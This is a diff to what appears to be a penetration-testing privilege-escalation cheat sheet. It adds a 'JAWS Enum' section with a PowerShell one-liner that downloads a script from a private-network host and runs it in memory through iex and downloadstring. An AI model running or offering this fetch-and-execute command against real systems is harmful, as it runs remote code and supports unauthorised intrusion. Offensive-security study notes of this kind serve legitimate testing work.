@@ -34,6 +34,9 @@ Then
 
     Invoke-PrivescCheck -Extended
 
+#### Alternate Script: JAWS Enum
+
+    iex(new-object net.webclient).downloadstring('http://192.168.45.241/jaws-enum.ps1')
 
 ### 2) Linux
 
